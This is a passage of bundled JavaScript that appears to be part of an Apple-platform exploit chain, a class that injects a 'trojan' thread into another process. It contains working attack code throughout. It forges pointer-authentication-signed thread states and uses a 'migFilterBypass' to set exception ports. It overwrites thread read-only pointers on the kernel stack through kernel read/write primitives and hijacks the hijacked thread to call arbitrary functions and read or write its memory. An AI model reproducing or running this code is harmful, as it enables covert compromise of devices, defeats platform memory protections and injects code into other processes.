		
		// Get mach port of the new thread and set exception port on it.
		let callThreadPort = this.#doRemoteCallTemp(100, "pthread_mach_thread_np", pthreadAddr);
		//console.log(TAG,`Call thread port:${Utils.hex(callThreadPort)}`);

		if (callThreadPort == 0n)
		{
			console.log(TAG,`Cannot find callThreadPort`);
			this.destroy();
			return null;
		}
		this.#callThreadAddr = _Task__WEBPACK_IMPORTED_MODULE_3__["default"].getPortKObjectOfTask(this.#taskAddr, BigInt(callThreadPort));
		//console.log(TAG,`Call thread addr:${Utils.hex(this.#callThreadAddr)}`);
		// Note that this exception port is not the same of the initial exception port we use for existing threads.

		if (migFilterBypass)
			migFilterBypass.resume();

		if (!this.#setExceptionPortOnThread(this.#secondExceptionPort, this.#callThreadAddr, migFilterBypass))
		{
			console.log(TAG,`Failed to set new exception port on newly created thread, trying one more time before giving up, creating new thread`);
			dummyThread = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;	
			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("pthread_create_suspended_np",dummyThread, null, dummyFunc, null);
			dummyThread = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read64(dummyThread);
			this.#dummyThreadMach = BigInt(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("pthread_mach_thread_np",dummyThread));
			this.#dummyThreadAddr = _Task__WEBPACK_IMPORTED_MODULE_3__["default"].getPortKObject(this.#dummyThreadMach);
			this.#dummyThreadTro = _Thread__WEBPACK_IMPORTED_MODULE_4__["default"].getTro(this.#dummyThreadAddr);
			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("sleep",1n);
			if (!this.#setExceptionPortOnThread(this.#secondExceptionPort, this.#callThreadAddr, migFilterBypass))
			{
				if (migFilterBypass)
					migFilterBypass.pause();
				this.destroy();
				return null;
			}
		}

		if (migFilterBypass)
			migFilterBypass.pause();
		
		console.log(TAG,`All good so far! Now we resume trojan thread...`);

		// Ok, now we are ready to start this thread and catch exceptions on it.
		ret = this.#doRemoteCallTemp(100, "thread_resume", callThreadPort);
		//console.log(TAG,`thread_resume():${ret}`);
		if (ret !== 0n)
		{
			console.log(TAG,`Couldn't resume newly created thread, falling back to use original one only`);
			this.#creatingExtraThread = false;
		}

		if (this.#creatingExtraThread)
		{
			console.log(TAG,`New thread created succesfully, resuming original`);
			this.#restoreTrojanThread(this.#originalState);
		}
		console.log(TAG, `Original thread restored succesfully`);

		// From this point on, the "stable" trojan thread is ready to process calls.
		//console.log(TAG, `Original thread restored succesfully, testing getpid on stable primitive`);
		this.#pid = this.#doRemoteCallStable(100, "getpid");
		console.log(TAG, `Task pid: ${this.#pid}`);
		
		//this.#trojanMem = trojanMemTemp;
		//this.#testRWPrim();

		// Allocate a general purpose remote page mem.
		this.#trojanMem = this.#doRemoteCallStable(1000,"mmap", 0n, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].PAGE_SIZE, _VM__WEBPACK_IMPORTED_MODULE_9__["default"].VM_PROT_READ | _VM__WEBPACK_IMPORTED_MODULE_9__["default"].VM_PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1n);
		//console.log(TAG,`Newly mapped memory:${Utils.hex(this.#trojanMem)}`);
		
		// Memory must be written at least once (COW) to be found in vmMap.
		this.#doRemoteCallStable(100,"memset",this.#trojanMem, 0n, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].PAGE_SIZE);

		this.#success = true;

		console.log(TAG,`Finished for now succesfully`);
	}

	success() {
		return this.#success;
	}

	krwCtx() {
		return {
			controlFd: this.#krwControlFd,
			rwFd: this.#krwRwFd
		};
	}

	pid() {
		return this.#pid;
	}

	#testRWPrim()
	{
		console.log(TAG,`Testing RW prim`);
		let arr = new ArrayBuffer(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].UINT64_SIZE);
		let arrView = new DataView(arr);
		arrView.setBigUint64(0,0x41414141n,true);
		let memBuff = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].write(memBuff,arr);
		this.write(BigInt(this.#trojanMem),memBuff,BigInt(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].UINT64_SIZE));
		memBuff = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem + 0x100n;
		this.read(BigInt(this.#trojanMem),memBuff,BigInt(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].UINT64_SIZE));
		let resBuff = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read(memBuff,libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].UINT64_SIZE);
		let resView = new DataView(resBuff);
		let result = resView.getBigUint64(0,true);
		console.log(TAG,`Got result from Buffer of:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].hex(result)}`);
	}

	#retryFirstThread(migFilterBypass) {
		if (migFilterBypass)
			migFilterBypass.pause();
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("sleep", 1n);
		if (migFilterBypass)
			migFilterBypass.resume();
		return _Task__WEBPACK_IMPORTED_MODULE_3__["default"].firstThread(this.#taskAddr);
	}

	#signState(SigningThread,state,pc,lr)
	{
		//console.log(TAG,`state.opaque_flags:${Utils.hex(state.opaque_flags)}`);
		let diver = BigInt(state.opaque_flags) & __DARWIN_ARM_THREAD_STATE64_USER_DIVERSIFIER_MASK;
		//console.log(TAG,`diver after:${Utils.hex(diver)}`);
		let discPC = libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].ptrauth_blend_discriminator(BigInt(diver), libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].ptrauth_string_discriminator_special("pc"));
		let discLR = libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].ptrauth_blend_discriminator(BigInt(diver), libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].ptrauth_string_discriminator_special("lr"));
		//console.log(TAG,`discPC:${Utils.hex(discPC)}`);
		//console.log(TAG,`discLR:${Utils.hex(discLR)}`);
		/* C wrapper for ptrauth utils
		discPC = Native.callSymbol("wrapper_ptrauth_blend_discriminator",BigInt(diver),Utils.ptrauth_string_discriminator("pc"));
		discLR = Native.callSymbol("wrapper_ptrauth_blend_discriminator",BigInt(diver), Utils.ptrauth_string_discriminator("lr"));
		console.log(TAG,`discPC after:${Utils.hex(discPC)}`);
		console.log(TAG,`discLR after:${Utils.hex(discLR)}`);
		*/
		if (pc)
		{
			state.opaque_flags &= ~(__DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC);
			state.opaque_pc = _PAC__WEBPACK_IMPORTED_MODULE_8__["default"].remotePAC(SigningThread, pc, discPC);
		}
		if (lr)
		{
			state.opaque_flags &= ~(
				__DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_LR |
				__DARWIN_ARM_THREAD_STATE64_FLAGS_IB_SIGNED_LR);
			state.opaque_lr = _PAC__WEBPACK_IMPORTED_MODULE_8__["default"].remotePAC(SigningThread, lr, discLR);
		}
		return state;
	}
	
	#setExceptionPortOnThread(exceptionPort, currThread, migFilterBypass=null)
	{
		let success = false;
		
		let thread_set_exception_ports_addr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].dlsym("thread_set_exception_ports");
		let pthread_exit_addr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].dlsym("pthread_exit");

		//console.log(TAG, "pc:          " + Utils.hex(thread_set_exception_ports_addr));
		//console.log(TAG, "pc signed:   " + Utils.hex(Native.pacia(thread_set_exception_ports_addr, Utils.ptrauth_string_discriminator("pc"))));
		//console.log(TAG, "pc signed 0: " + Utils.hex(Native.pacia(thread_set_exception_ports_addr, 0)));

		//let stackMem = Native.callSymbol("malloc", 0x8000);
		//let thread_set_exception_ports_addr = Native.dlsym("_exit");
		//let stateBuff = new ArrayBuffer(Utils.ARM_THREAD_STATE64_SIZE);
		//let state = new ThreadState(stateBuff);

		//let kr = Native.callSymbol("thread_create_running", 0x203, Utils.ARM_THREAD_STATE64, statePtr, Utils.ARM_THREAD_STATE64_COUNT, machThreadPtr);
		
		let pthreadPtr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("pthread_create_suspended_np", pthreadPtr, 0, thread_set_exception_ports_addr, 0);
		let pthread = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read64(pthreadPtr);
		//console.log(TAG, "pthread: " + Utils.hex(pthread));

		let machThread = BigInt(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("pthread_mach_thread_np", pthread));
		let machThreadAddr = _Task__WEBPACK_IMPORTED_MODULE_3__["default"].getPortKObject(machThread);
		//console.log(TAG, `machThread:${Utils.hex(machThread)} machThreadAddr:${Utils.hex(machThreadAddr)}`);

		if (migFilterBypass)
			migFilterBypass.monitorThreads(this.#selfThreadAddr, machThreadAddr);

		let state = _Thread__WEBPACK_IMPORTED_MODULE_4__["default"].getState(machThread);
		if (!state) {
			console.log(TAG, "Unable to read thread state");
			return false;
		}

		//console.log(TAG, "thread_get_state OK");

		state.opaque_pc = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].pacia(thread_set_exception_ports_addr, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].ptrauth_string_discriminator("pc"));
		state.opaque_lr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].pacia(pthread_exit_addr, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].ptrauth_string_discriminator("lr"));
		//state.opaque_sp = stackMem + 0x4000n;
		state.registers.set(0, this.#dummyThreadMach);
		state.registers.set(1, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].EXC_MASK_GUARD | libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].EXC_MASK_BAD_ACCESS);
		state.registers.set(2, exceptionPort);
		state.registers.set(3, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].EXCEPTION_STATE | libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].MACH_EXCEPTION_CODES);
		state.registers.set(4, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].ARM_THREAD_STATE64);

		//console.log(TAG, "pc: " + Utils.hex(state.opaque_pc));
		//console.log(TAG, "lr: " + Utils.hex(state.opaque_lr));
		//console.log(TAG, "sp: " + Utils.hex(state.opaque_sp));
		//console.log(TAG, "x0: " + Utils.hex(state.registers.get(0)));
		//console.log(TAG, "x1: " + Utils.hex(state.registers.get(1)));
		//console.log(TAG, "x2: " + Utils.hex(state.registers.get(2)));
		//console.log(TAG, "x3: " + Utils.hex(state.registers.get(3)));
		//console.log(TAG, "x4: " + Utils.hex(state.registers.get(4)));

		if (migFilterBypass)
			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("usleep", 100000);
	
		if (!_Thread__WEBPACK_IMPORTED_MODULE_4__["default"].setState(machThread, machThreadAddr, state))
			return false;

		//console.log(TAG, "Thread.setState() OK");

		if (migFilterBypass)
			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("usleep", 100000);

		_Thread__WEBPACK_IMPORTED_MODULE_4__["default"].setMutex(this.#dummyThreadAddr, this.#selfThreadCtid);
		
		if (!_Thread__WEBPACK_IMPORTED_MODULE_4__["default"].resume(machThread))
			return false;

		//console.log(TAG, "Thread resume OK");

		/*
		let threadmem = Native.callSymbol("malloc",0x400);
		Native.write64(threadmem + 0x100n, this.#dummyThreadMach);
		Native.write64(threadmem + 0x108n, exceptionPort);
		Native.callSymbol("usleep",100n);
		Chain.threadSpawn(this.#exceptionThreadCFString, threadmem);
		let timeout = 10000n;
		if(largeTimeout)
			timeout = 30000n;
		Native.callSymbol("usleep",timeout);
		let machThread = Native.read64(threadmem + 0x100n);
		Native.callSymbol("free",threadmem);
		let machThreadAddr = 0n;
		if(machThread == this.#dummyThreadMach)
		{
			console.log(TAG,`remote thread didn't succeed, aborting`);
			Thread.setMutex(this.#dummyThreadAddr, 0x40000000); // LCK_MTX_NEEDS_WAKEUP
			Native.callSymbol("thread_switch", machThread, SWITCH_OPTION_NONE, 0n);
			// This will wake up setter
			Native.callSymbol("thread_set_exception_ports", this.#dummyThreadMach, 0n, ExceptionPort , Utils.EXCEPTION_STATE | Utils.MACH_EXCEPTION_CODES, BigInt(Utils.ARM_THREAD_STATE64));
			Native.callSymbol("thread_switch", machThread, SWITCH_OPTION_NONE, 0n);
			return false;
		}
		else
			machThreadAddr = Task.getPortKObject(machThread);
		*/

		//Native.callSymbol("usleep",100n);
		//kr = Native.callSymbol("thread_switch", machThread, SWITCH_OPTION_NONE, 0n);
		//console.log(TAG, "thread_switch: " + kr);
		//if (!machThreadAddr)
		//{
		//	console.log(TAG,`Unable to get machThreadAddr`);
			//return false;
		//}
		//console.log(TAG, "Successfully switched to new mach thread");

		//Native.callSymbol("sleep", 2);
		//Native.callSymbol("usleep", 100000);

		//Native.callSymbol("sleep", 1);

		for (let i=0; i<10; i++) {
			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("usleep", 200000);

			let kstack = 0x0n;
			//let retries = 0n;
			//while (true && !kstack && retries < 100000n)
			//{
			//	//Native.callSymbol("usleep",100n);
			//	kstack = Thread.getStack(machThreadAddr);
			//	retries++;
			//}
			kstack = _Thread__WEBPACK_IMPORTED_MODULE_4__["default"].getStack(machThreadAddr);
			if (!kstack)
			{
				console.log(TAG,`Failed to get kstack. Retry...`);
				continue;
			}
			//console.log(TAG,`kstack:${Utils.hex(kstack)}`);
			// Waiting a bit longer to make sure pointer is valid
			//Native.callSymbol("usleep",10000n);
			//console.log(TAG,`Current mutex:${Utils.hex(Thread.getMutex(this.#dummyThreadAddr))}`);
			//uwrite64(threadmem + 0x100n,0x0n); // instead of free
			let kernelSPOffset = BigInt(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].UINT64_SIZE * 12);
			let kernelSP = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read64(kstack + kernelSPOffset);
			if (!kernelSP) {
				console.log(TAG, "Failed to get SP. Retry...");
				continue;
			}
			//console.log(TAG,`kernelSP:${Utils.hex(kernelSP)}`);
			//Native.callSymbol("usleep",20000n);
			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("usleep",100n);
			//let data = Native.callSymbol("malloc",0x1000n);
			//console.log(TAG,`Before reading from page`);
			let dataBuff = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].readBuff(_Task__WEBPACK_IMPORTED_MODULE_3__["default"].trunc_page(kernelSP) + 0x3000n, 0x1000);
			if (!dataBuff) {
				console.log(TAG, "Failed to read from kernel SP. Aborting...");
				break;
			}
			//console.log(TAG,`Second read finished succesfully`);
			//Native.callSymbol("usleep",100n);
			//let dataBuff = Native.read(data,0x1000);
			//Native.callSymbol("free",data);

			//let troPointer = Native.mem;
			let buffer = new ArrayBuffer(8);
			const view = new DataView(buffer);
			view.setBigUint64(0,this.#dummyThreadTro,true);
			let found = libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].memmem(dataBuff,buffer);
			//console.log(TAG,`found:${Utils.hex(found)}`);
			found = BigInt(found) + 0x3000n;
			let correctTro = false;
			let val = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
			libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read(_Task__WEBPACK_IMPORTED_MODULE_3__["default"].trunc_page(kernelSP) + found + 0x18n, val, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].UINT64_SIZE);
			val = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].readPtr(val);
			if(val == 0x1002)
				correctTro = true;
			else {
				console.log(TAG, "Wrong tro. Retry...");
				continue;
			}
				//console.log(TAG,`Wrong tro, skipping this thread`);
			if (found && correctTro)
			{
				//console.log(TAG,`Found TRO!`);
				if(_Thread__WEBPACK_IMPORTED_MODULE_4__["default"].getTask(currThread) == this.#taskAddr)
				{
					let tro = _Thread__WEBPACK_IMPORTED_MODULE_4__["default"].getTro(currThread);
					//console.log(TAG,`tro:${Utils.hex(tro)}`);
					libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].write64(_Task__WEBPACK_IMPORTED_MODULE_3__["default"].trunc_page(kernelSP) + BigInt(found), tro);
					success = true;
					break;
				}
				else
				{
					console.log(TAG,`got empty tro, skip writing`);
				}
			}
			else
			{
				console.log(TAG, `didnt find tro for ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].hex(currThread)}`);
			}
		}

		//console.log(TAG,`Injecting into:${Utils.hex(currThread)}`);
		// Set LCK_MTX_NEEDS_WAKEUP so that setter would be woken up by the turnstile of the lock on next use.
		_Thread__WEBPACK_IMPORTED_MODULE_4__["default"].setMutex(this.#dummyThreadAddr, 0x40000000); // LCK_MTX_NEEDS_WAKEUP

		//Native.callSymbol("thread_switch", machThread, SWITCH_OPTION_NONE, 0n);
		// This will wake up setter
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("thread_set_exception_ports", this.#dummyThreadMach, 0n, exceptionPort , libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].EXCEPTION_STATE | libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].MACH_EXCEPTION_CODES, BigInt(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].ARM_THREAD_STATE64));
		//Native.callSymbol("thread_switch", machThread, SWITCH_OPTION_NONE, 0n);
		//Native.callSymbol("usleep",40000n);
		//console.log(TAG,`After second thread switch`);
		//pthread_join(setExceptionThread, NULL);
		//mpd_js_thread_join(th);
		//free(data);
		//console.log(TAG,`Finish injecting into:${Utils.hex(currThread)}`);

		if (migFilterBypass)
			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("usleep", 100000);

		return success;
	}

	#doRemoteCallTemp(
		timeout,
		name,
		x0 = 0n,
		x1 = 0n,
		x2 = 0n,
		x3 = 0n,
		x4 = 0n,
		x5 = 0n,
		x6 = 0n,
		x7 = 0n)
	{
		let newTimeout = libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].MAX(10000,timeout);
		//Calculate actual pc addr
		let pcAddr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].dlsym(name);
		// First wait for the pending exception caused by previous state corruption, so we can the reply with a new state.
		let excBuffer = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
		if (!_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].waitException(this.#firstExceptionPort, excBuffer, newTimeout, false))
		{
			console.log(TAG,`Don't receive first exception on original thread`);
			return 0;
		}
		let excRes = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read(excBuffer,Number(_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].ExceptionMessageSize));
		let exc = new _ExceptionMessageStruct__WEBPACK_IMPORTED_MODULE_6__["default"](excRes);
		// Set the new state
		let newState = exc.threadState;
		newState.registers.set(0,x0);
		newState.registers.set(1,x1);
		newState.registers.set(2,x2);
		newState.registers.set(3,x3);
		newState.registers.set(4,x4);
		newState.registers.set(5,x5);
		newState.registers.set(6,x6);
		newState.registers.set(7,x7);
		newState = this.#signState(this.#trojanThreadAddr, newState, pcAddr, fakeLRTrojanCreator);
		_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].replyWithState(exc, newState, false);
		exc.threadState.registers.set(0,x0);
	
		// Don't wait for a new exception if timeout is < 0. Eg, when doing cleanup of trojan thread.
		if (timeout < 0)
		{
			console.log(TAG,`Trojan thread cleanup`);
			return 0;
		}
		// Wait for the exception on LR corruption, so we can get return value of the call.
		if (!_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].waitException(this.#firstExceptionPort, excBuffer, newTimeout, false))
		{
			console.log(TAG,`Don't receive second exception on original thread`);
			return 0;
		}
		excRes = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read(excBuffer,Number(_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].ExceptionMessageSize));
		exc = new _ExceptionMessageStruct__WEBPACK_IMPORTED_MODULE_6__["default"](excRes);
		let retValue = exc.threadState.registers.get(0);
	
		// Corrupt again PC so we can control flow for the next call.
		newState = exc.threadState;
		// Can be therotical used one previous implementation doesn't set LR
		//signState(remoteCall->trojanThreadAddr, &newState, 0x101, 0);
		_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].replyWithState(exc, newState, false);
	
		return retValue;
	}

	#doRemoteCallStable(
		timeout,
		name,
		x0 = 0n,
		x1 = 0n,
		x2 = 0n,
		x3 = 0n,
		x4 = 0n,
		x5 = 0n,
		x6 = 0n,
		x7 = 0n)
	{
		if (!this.#creatingExtraThread)
			return this.#doRemoteCallTemp(timeout, name, x0, x1, x2, x3, x4, x5, x6, x7);
			
		//Calculate actual pc addr
		let pcAddr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].dlsym(name);
		if (!pcAddr) {
			console.log(TAG, "Unable to find symbol: " + name);
			return 0;
		}
		let newTimeout = libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].MAX(10000,timeout);
		// First wait for the pending exception caused by previous state corruption, so we can the reply with a new state.
		let excBuffer = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
		if (!_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].waitException(this.#secondExceptionPort, excBuffer, newTimeout, false))
		{
			console.log(TAG,`Don't receive first exception on new thread`);
			return 0;
		}
		let excRes = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read(excBuffer,Number(_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].ExceptionMessageSize));
		let exc = new _ExceptionMessageStruct__WEBPACK_IMPORTED_MODULE_6__["default"](excRes);
		// Set the new state
		let newState = exc.threadState;
		newState.registers.set(0,x0);
		newState.registers.set(1,x1);
		newState.registers.set(2,x2);
		newState.registers.set(3,x3);
		newState.registers.set(4,x4);
		newState.registers.set(5,x5);
		newState.registers.set(6,x6);
		newState.registers.set(7,x7);
		newState = this.#signState(this.#trojanThreadAddr, newState, pcAddr, fakeLRTrojan);
		_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].replyWithState(exc, newState, false);
		exc.threadState.registers.set(0, x0);

		// Don't wait for a new exception if timeout is < 0. Eg, when doing cleanup of trojan thread.
		if (timeout < 0)
		{
			console.log(TAG,`Trojan thread cleanup`);
			return 0;
		}
		// Wait for the exception on LR corruption, so we can get return value of the call.
		if (!_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].waitException(this.#secondExceptionPort, excBuffer, newTimeout, false))
		{
			console.log(TAG,`Don't receive second exception on new thread`);
			return 0;
		}
		excRes = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read(excBuffer,Number(_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].ExceptionMessageSize));
		exc = new _ExceptionMessageStruct__WEBPACK_IMPORTED_MODULE_6__["default"](excRes);
		let retValue = exc.threadState.registers.get(0);
	
		// Corrupt again PC so we can control flow for the next call.
		newState = exc.threadState;
		// Can be therotical used one previous implementation doesn't set LR
		//signState(remoteCall->trojanThreadAddr, &newState, 0x101, 0);
		_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].replyWithState(exc, newState, false);
	
		return retValue;
	}

	call(
		timeout,
		pc,
		x0 = 0n,
		x1 = 0n,
		x2 = 0n,
		x3 = 0n,
		x4 = 0n,
		x5 = 0n,
		x6 = 0n,
		x7 = 0n)
	{
		//console.log(TAG, `call(${Utils.hex(pc)}, ${Utils.hex(x0)}, ${Utils.hex(x1)}, ${Utils.hex(x2)}, ${Utils.hex(x3)})`);
		return this.#doRemoteCallStable(timeout, pc, x0, x1, x2, x3, x4, x5, x6, x7);
	}

	#restoreTrojanThread(state)
	{
		let excBuffer = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
		if (!_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].waitException(this.#firstExceptionPort, excBuffer, 20000, false))
		{
			console.log(TAG,`Failed to receive first exception while restoring`);
			return false;
		}
		let excRes = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read(excBuffer,Number(_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].ExceptionMessageSize));
		let exc = new _ExceptionMessageStruct__WEBPACK_IMPORTED_MODULE_6__["default"](excRes);
		state.opaque_flags = exc.threadState.opaque_flags;
		state = this.#signState(this.#trojanThreadAddr, state,state.opaque_pc,state.opaque_lr);
		_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].replyWithState(exc, state, false);
		return true;
	}

	destroy()
	{
		this.#doRemoteCallStable(100, "munmap", this.#trojanMem, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].PAGE_SIZE);
		if (this.#creatingExtraThread)
			this.#doRemoteCallStable(-1, "pthread_exit");
		else
			this.#restoreTrojanThread(this.#originalState);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("mach_port_destruct", 0x203, this.#firstExceptionPort, 0n, 0n);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("mach_port_destruct", 0x203, this.#secondExceptionPort, 0n, 0n);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("pthread_cancel", this.#dummyThread);
	}

	read(src, dst, size)
	{
		if (!src || !dst || !size)
			return false;

		dst = BigInt(dst);
		src = BigInt(src);
		size = BigInt(size);

		//console.log(TAG, `read(): src=${Utils.hex(src)}, dst=${Utils.hex(dst)}, size=${size}`);
		let until = src + size;
		while (src < until)
		{
			size = until - src;
			let offs = src & libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].PAGE_MASK;
			let copyCount =  libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].MIN(_Task__WEBPACK_IMPORTED_MODULE_3__["default"].round_page(src + 1n) - src, size);
			let pageAddr = _Task__WEBPACK_IMPORTED_MODULE_3__["default"].trunc_page(src);
	
			let remotePage = this.#getShmemForPage(pageAddr);
			if (!remotePage) {
				console.log(TAG, "read() failed: unable to find remote page");
				return false;
			}
	
			//console.log(TAG,`remotePage: remote=${Utils.hex(remotePage.remoteAddress)}, local=${Utils.hex(remotePage.localAddress)}, port=${Utils.hex(remotePage.port)}`);
			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("memcpy", dst, remotePage.localAddress + offs, copyCount);
	
			src += copyCount;
			dst += copyCount;
		}
		return true;
	}

	write(dst, src, size)
	{
		if (!src || !dst || !size)
			return false;

		dst = BigInt(dst);
		src = BigInt(src);
		size = BigInt(size);

		let until = dst + size;

		//console.log(TAG, `write(): dst=${Utils.hex(dst)}, src=${Utils.hex(src)}, size=${size}`);
	
		while (dst < until)
		{
			size = until - dst;
			let offs = dst & libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].PAGE_MASK;
			let copyCount = libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].MIN(_Task__WEBPACK_IMPORTED_MODULE_3__["default"].round_page(dst + 1n) - dst, size);
			let pageAddr = _Task__WEBPACK_IMPORTED_MODULE_3__["default"].trunc_page(dst);
	
			let remotePage = this.#getShmemForPage(pageAddr);
			if (!remotePage) {
				console.log(TAG, "write() failed: unable to find remote page");
				return false;
			}
	
			//console.log(TAG,`remotePage: remote=${Utils.hex(remotePage.remoteAddress)}, local=${Utils.hex(remotePage.localAddress)}, offs=${offs}, length=${copyCount}, port=${Utils.hex(remotePage.port)}`);
			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("memcpy", remotePage.localAddress + offs, src, copyCount);
	
			dst += copyCount;
			src += copyCount;
		}
		return true;	
	}

	writeStr(dst, str)
	{
		if (!str)
			return false;
		//return this.write(dst, Native.getCString(str), str.length + 1);
		let mem = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("malloc", str.length + 1);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].writeString(mem, str);
		const ret = this.write(dst, mem, str.length + 1);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("free", mem);
		return ret;
	}

	read64(src)
	{
		if (!this.read(src, libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].UINT64_SIZE))
			return false;
		const buff = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].UINT64_SIZE);
		const view = new DataView(buff);
		return view.getBigUint64(0, true);
	}

	write64(dst, val)
	{
		const buff = new ArrayBuffer(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].UINT64_SIZE);
		const view = new DataView(buff);
		view.setBigUint64(0, val, true);
